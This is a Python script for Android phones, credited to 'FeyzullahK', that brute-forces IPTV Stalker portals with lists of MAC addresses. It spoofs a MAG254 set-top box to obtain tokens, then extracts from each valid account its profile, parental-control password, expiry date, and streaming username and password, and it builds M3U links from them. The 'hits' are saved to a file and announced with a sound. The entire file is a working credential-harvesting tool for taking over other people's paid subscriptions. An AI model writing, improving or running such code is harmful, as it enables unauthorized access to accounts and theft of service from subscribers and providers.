import requests, datetime,re,sys
import json,random,sys,time
import subprocess
import androidhelper as sl4a
import pathlib
ad = sl4a.Android()
subprocess.run(["clear", ""])
say=0
bul=0
hit=0
cpm=0
ses= requests.Session()
feyzo=("""
\33[32m
 ▰▰▰▰ᴘʏᴛʜᴏɴ ᴍᴏʀ-TXT-ᴘʏ ᴄᴏɴғɪɢ▰▰▰▰ ''\33[0m\n
Bu çalışma FeyzullahK tarafından kodlanmıştır. 
Hiçbir kaynak kullanılmamış ve alıntı yapılmamıştır. 
 
 \33[33mDestek verenler:
     @BarisTM
     @ByTurK_Turkiye
     @garaveli(Bestsharingsteam) \33[0m
     \33[32m
 ▰▰▰▰▰▰▰ 𝙈𝙧.𝙁𝙚𝙮𝙯𝙤@ ▰▰▰▰▰▰▰  '' " '
\33[0m""") 
print(feyzo) 
pattern= "(00:\w{2}:79:\w{2}:\w{2}:\w{2})"

MacComboDosyaAdi=input("""
Digite o nome do seu combo MAC...!
	\33[1mNome do arquivo = """) 
dsy='/sdcard/combo/'+MacComboDosyaAdi+'.txt'
dosya=""
file = pathlib.Path(dsy)
if file.exists ():
    print ("Arquivo Encontrado")
else:
    print("\33[31mArquivo não encontrado..! \33[0m") 
    dosya="yok"
#print(len(feyzo)) 
if not (len(feyzo)) ==299 or dosya=="yok" :
    exit() 
subprocess.run(["clear", ""])
print(feyzo) 
#################
panel = input("""
Exemplo Nome do painel:porta = josieljefferson.com:8080\n
	\33[1mPor favor, escreva o nome do painel.. ? \n
Painel:Porta = \33[0m\33[31m\33[1m""")
#################
panel=panel.replace("http://","")
panel=panel.replace("/c","")
panel=panel.replace("/","")
subprocess.run(["clear", ""])
#subprocess.run(["clear", ""])
print(feyzo) 
DosyaA="/sdcard/Hits/" + panel.replace(":","_") +"@Feyzo.txt"
def yaz(hits):
    dosya=open(DosyaA,'a+') 
    dosya.write(hits)
    dosya.close()

for mac in open('/sdcard/combo/'+MacComboDosyaAdi+'.txt', 'r'):
	macv =re.search(pattern,mac,re.IGNORECASE)
	if macv:
		mac=macv.group()
		mac=mac.replace(" ","")
		mac=mac.replace('\n',"")
		headera={
		"Host": panel,
		"Connection": "keep-alive",
		"Accept": "*/*",
		"User-Agent": "Mozilla/5.0 (QtEmbedded; U;Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3",
		"Referer": "http://"+panel+"/c/" ,
		"Accept-Language": "en-US,*",
		"Accept-Charset": "UTF-8,*;q=0.8",
		"X-User-Agent": "Model: MAG254; Link: Ethernet,WiFi",
		"Cookie": "mac="+mac+"; stb_lang=en; timezone=Europe%2FBerlin; adid=91b4a5f6dfb347d871ac2b624696917f",
		"Accept-Encoding": "gzip, deflate",
		}
		
		url1="http://"+panel+"/portal.php?type=stb&action=handshake&token=" 
		res = ses.get(url1, headers=headera, timeout=20, verify=False)
		
		veri=str(res.text)
		#print(veri)
		say=say+1
		cpm=(time.time()-cpm)
		cpm=(round(60/cpm))
		print (mac+" - \33[32m" +panel +'\033[96m\n' +"      >>>>>Total:" + str(say)+" \33[33m" "Hit:" + str(hit)+"\33[94m Cpm:" +str(cpm)+"\033[0m")
		cpm=time.time()
		
		if not veri in ("js"):
			token=veri.replace('{"js":{"token":"',"")
			token=token.replace('"}}',"")
			#print(token)
			
			headerb={
			"Host": panel,
			"Connection": "keep-alive",
			"Accept": "*/*",
			"User-Agent": "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3",
			"Referer": "http://"+panel+"/c/" ,
			"Accept-Language": "en-US,*",
			"Accept-Charset": "UTF-8,*;q=0.8",
			"X-User-Agent": "Model: MAG254; Link: Ethernet,WiFi",
			"Cookie": "mac="+mac+"; stb_lang=en; timezone=Europe%2FBerlin; adid=91b4a5f6dfb347d871ac2b624696917f",
			"Authorization": "Bearer "+token,
			}
			
			url2="http://"+panel+"/portal.php?type=stb&action=get_profile"
			res = ses.get(url2, headers=headerb, timeout=15, verify=False)
			veri=str(res.text)
			#print(veri)
			chk=veri.split('{"id":')[1]
			chk=chk.split(',"name')[0]
			chk=chk.replace('"',"")
			if not chk =="null":
				adult=veri.split('parent_password":"')[1]
				adult=adult.split('"')[0]
				#print(chk+'\n')
				#hit=hit+1
				headerc={
				"Host": panel,
				"Connection": "keep-alive",
				"Accept": "*/*",
				"User-Agent": "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3",
				"Referer": "http://"+panel+"/c/" ,
				"Accept-Language": "en-US,*",
				"Accept-Charset": "UTF-8,*;q=0.8",
				"X-User-Agent": "Model: MAG254; Link: Ethernet,WiFi",
				"Cookie": "mac="+mac+"; stb_lang=en; timezone=Europe%2FBerlin; adid=91b4a5f6dfb347d871ac2b624696917f",
				"Accept-Encoding": "gzip, deflate",
				"Authorization": "Bearer "+token,
				}
				
				url3="http://"+panel+"/portal.php?type=account_info&action=get_main_info&JsHttpRequest=1-xml&mac=" + mac
				
				res = ses.get(url3, headers=headerc, timeout=15, verify=False)
				veri=str(res.text)
				passw=""
				#print(veri)
				if not veri in ("phone"):
					trh=veri.split('phone":"')[1]
					trh=trh.replace('"}}',"")
					hit=hit+1
					file = pathlib.Path("/sdcard/kemik_sesi.mp3")
					if file.exists ():
						ad.mediaPlay("/sdcard/kemik_sesi.mp3")
						
					#print(trh)
					#url4="http://"+panel+"/portal.php?type=itv&action=create_link&cmd=ffmpeg%20http://localhost/ch/1823_&series=&forced_storage=0&dis9able_ad=0&download=0&force_ch_link_check=0&JsHttpRequest=1-xml"o
					#res = ses.get(url4, headers=headerc, timeout=15, verify=False)
					#veri=str(res.text)
					#print(veri)
					
					veri=""
					url5="http://"+panel+"/portal.php?action=get_ordered_list&type=vod&p=1&JsHttpRequest=1-xml" 
					res = ses.get(url5, headers=headerc, timeout=15, verify=False)
					
					veri=str(res.text)
					try:
						token2=veri.split('cmd":"')[1]
						token2=token2.split('"')[0]
					except:pass
					#print(token2)
					#print(veri)
					
					url6="http://"+panel+"/portal.php?action=create_link&type=vod&cmd="+token2+"&JsHttpRequest=1-xml"
					
					res = ses.get(url6, headers=headerc, timeout=15, verify=False)
					veri=str(res.text)
					try:
						real=veri.split('\/')[2]
						userm=veri.split('\/')[4]
						pasdm=veri.split('\/')[5]
						#print(real+'\n'+userm+'\n'+pasdm)
						headerm={
						"Host": panel,
						"Connection": "keep-alive",
						"User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
						"Pragma": "no-cache",
						"Accept": "*/*",
						"Accept-Encoding": "gzip, deflate",
						}
						
						urlm="http://"+panel+"/player_api.php?username="+userm+"&password="+pasdm+"&type=m3u"
						
						mlink="http://"+ panel + "/get.php?username=" + userm + "&password=" + pasdm + "&type=m3u_plus"
						res = ses.get(urlm, headers=headerm, timeout=15, verify=False)
						veri=str(res.text)
						vvv=veri[:1]
					except:pass
					imza=""
					mc=""
					if veri =="":
						vvv="<"
					#print(veri)
					#print(vvv)™
					if not vvv =="<":
						portal=veri.split('url":')[1]
						portal=portal.split(',')[0]
						realm="𝗥𝗲𝗮𝗹 ➤ http://"+portal.replace('"',"")
						portal="𝗣𝗼𝗿𝘁𝗮𝗹 ➤ http://"+panel+"/c/"
						port=veri.split('port":')[1]
						port=port.split(',')[0]
						port=""+port.replace('"',"")
					
						user=veri.split('username":')[1]
						user=user.split(',')[0]
						user="𝗟𝗼𝗴𝗶𝗻 ➤ "+user.replace('"',"")
					
						passw=veri.split('password":')[1]
						passw=passw.split(',')[0]
						passw=""+passw.replace('"',"")
					
						bitis=veri.split('exp_date":')[1]
						bitis=bitis.split(',')[0]
						bitis=bitis.replace('"',"")
						if bitis=="null":
							bitis="Ilimitado"
						else:
							bitis=(datetime.datetime.fromtimestamp(int(bitis)).strftime('%d-%m-%Y %H:%M:%S'))
						bitis=""+bitis
					
						acon=veri.split('active_cons":')[1]
						acon=acon.split(',')[0]
						acon="𝗖𝗼𝗻𝗲𝘅𝗮𝗼 𝗮𝘁𝗶𝘃𝗮 ➤ "+acon.replace('"',"")
						mcon=veri.split('max_connections":')[1]
						mcon=mcon.split(',')[0]
						mcon="𝗠𝗮𝘅𝗶𝗺𝗼 𝗱𝗲 𝗰𝗼𝗻𝗲𝘅𝗮𝗼 ➤ "+mcon.replace('"',"")
					mc="╭───────────────•✧[ 𝗣𝘆𝘁𝗵𝗼𝗻 𝗠𝗢𝗥-𝗣𝗬 𝗖𝗼𝗻𝗳𝗶𝗴 ]✧•───────────────╮"+'\n'+"├✧𝗥𝗲𝗮𝗹 ➤ http://"+real+'\n'+"├✧𝗣𝗮𝗶𝗻𝗲𝗹 ➤ http://"+panel+"/c/"+'\n'+"├✧𝗠𝗮𝗰 ➤ "+mac+'\n'+"├✧𝗩𝗲𝗿𝗶𝗳𝗶𝗰𝗮𝗱𝗼 ➤ "+str(time.strftime("%d-%m-%Y %H:%M:%S"))+'\n'+"├✧𝗘𝘅𝗽𝗶𝗿𝗮 ➤ "+bitis+" / "+trh+'\n'+"├✧𝗖𝗼𝗻𝘁𝗿𝗼𝗹𝗲 𝗽𝗮𝗿𝗲𝗻𝘁𝗮𝗹 ➤ " +adult+'\n'
					imza=mc
					if not passw=="":
						imza=imza+"├✧─────────────•✧[ @𝗙𝗲𝘆𝘇𝘂𝗹𝗹𝗮𝗵𝗞<=>@𝗠𝗿.𝗙𝗲𝘆𝘇𝗼 ]✧•────────────"+'\n'+"├✧𝗨𝗥𝗟 ➤ http://"+panel+'\n'+"├✧"+user+" | "+passw+'\n'+"├✧"+acon+'\n'+"├✧"+mcon+'\n'
					imza=imza+"├✧𝗠𝟯𝗨 𝗨𝗥𝗟 ➤ "+mlink+'\n'
						
					imza=imza+"╰───────•✧[ 𝗣𝘆𝘁𝗵𝗼𝗻 𝗠𝗼𝗯𝗶𝗹𝗱𝗲𝗻 𝗧𝗮𝗺𝗮𝗿𝗮 𝗯𝘆 𝗝𝗼𝘀𝗶𝗲𝗹 𝗝𝗲𝗳𝗳𝗲𝗿𝘀𝗼𝗻 ]✧•───────╯"+'\n'+""+'\n' 
					print(imza)
					yaz(imza+'\n'+'\n')
			

#		
#